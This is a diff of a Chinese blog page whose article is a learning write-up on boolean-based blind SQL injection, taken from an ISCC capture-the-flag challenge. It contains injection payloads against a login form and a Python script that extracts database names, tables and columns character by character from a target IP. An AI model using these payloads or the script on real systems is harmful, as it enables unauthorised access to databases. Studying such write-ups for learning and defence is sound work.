@@ -9,18 +9,18 @@
   
   <title>基于布尔盲注的学习笔记 | Grim&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal user">
+  <meta name="description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal">
 <meta property="og:type" content="article">
 <meta property="og:title" content="基于布尔盲注的学习笔记">
 <meta property="og:url" content="http://yoursite.com/2018/07/06/基于布尔盲注的SQL/index.html">
 <meta property="og:site_name" content="Grim&#39;s blog">
-<meta property="og:description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal user">
+<meta property="og:description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/L3V%25_%5BWHV%287%5BP%25~Q%7B%7BC3QL0.png">
-<meta property="og:updated_time" content="2018-05-22T05:42:20.861Z">
+<meta property="og:updated_time" content="2018-07-06T09:54:54.226Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于布尔盲注的学习笔记">
-<meta name="twitter:description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal user">
+<meta name="twitter:description" content="参考链接:https://blog.csdn.net/squeen_/article/details/52767887 这里引用的是iscc的一道sql盲注题 Iscc web Sqli一道比较简单的布尔盲注题  首先找到注入点,测试是否为布尔盲注:  12admin&amp;apos;  // 返回账号密码错误&amp;lt;br&amp;gt;admin&amp;apos; and 1 =1# //返回normal">
 <meta name="twitter:image" content="http://p1vrkwaxt.bkt.clouddn.com/L3V%25_%5BWHV%287%5BP%25~Q%7B%7BC3QL0.png">
   
     <link rel="alternative" href="/atom.xml" title="Grim&#39;s blog" type="application/atom+xml">
@@ -298,7 +298,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>参考链接:<a href="https://blog.csdn.net/squeen_/article/details/52767887" target="_blank" rel="noopener">https://blog.csdn.net/squeen_/article/details/52767887</a></p>
+        <a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+
+<p>参考链接:<a href="https://blog.csdn.net/squeen_/article/details/52767887" target="_blank" rel="noopener">https://blog.csdn.net/squeen_/article/details/52767887</a></p>
 <p>这里引用的是iscc的一道sql盲注题</p>
 <h2 id="Iscc-web-Sqli"><a href="#Iscc-web-Sqli" class="headerlink" title="Iscc web Sqli"></a>Iscc web Sqli</h2><p>一道比较简单的布尔盲注题<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/L3V%25_%5BWHV%287%5BP%25~Q%7B%7BC3QL0.png" alt="image"></p>
 <ul>
@@ -315,7 +319,7 @@
 <h3 id="四、得到字段名"><a href="#四、得到字段名" class="headerlink" title="四、得到字段名"></a>四、得到字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;news&apos;),1,1))&gt;1#</span><br></pre></td></tr></table></figure>
 <h3 id="五、得到字段的内容"><a href="#五、得到字段的内容" class="headerlink" title="五、得到字段的内容"></a>五、得到字段的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news),1,1))&gt;1#</span><br></pre></td></tr></table></figure>
 <h3 id="python脚本获取"><a href="#python脚本获取" class="headerlink" title="python脚本获取"></a>python脚本获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8011/&apos;</span><br><span class="line"></span><br><span class="line">def test(num,asc):</span><br><span class="line">	# data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr(database(),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125; //sqli_database</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//news,user</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&apos;news\&apos;),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//</span><br><span class="line">	data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news ),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;</span><br><span class="line">	r = requests.post(url,data=data)</span><br><span class="line">	if &apos;normal&apos; in r.text:</span><br><span class="line">		return 1</span><br><span class="line">	else:</span><br><span class="line">		return 0</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for num in range(0,100):</span><br><span class="line">	for asc in range(0,255):</span><br><span class="line">		get = test(num,asc)</span><br><span class="line">		if get == 0:</span><br><span class="line">			flag += chr(asc)</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
-
+</the>
       
     </div>
     
@@ -326,7 +330,7 @@
         <p><span>本文标题:</span><a  href="/2018/07/06/基于布尔盲注的SQL/">基于布尔盲注的学习笔记</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Mr1.Grim 的个人博客">Mr1.Grim</a></p>
         <p><span>发布时间:</span>2018年07月06日 - 13时24分</p>
-        <p><span>最后更新:</span>2018年05月22日 - 13时42分</p>
+        <p><span>最后更新:</span>2018年07月06日 - 17时54分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/07/06/基于布尔盲注的SQL/" title="基于布尔盲注的学习笔记">http://yoursite.com/2018/07/06/基于布尔盲注的SQL/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/06/基于布尔盲注的SQL/　　作者: Mr1.Grim" title=""></span>
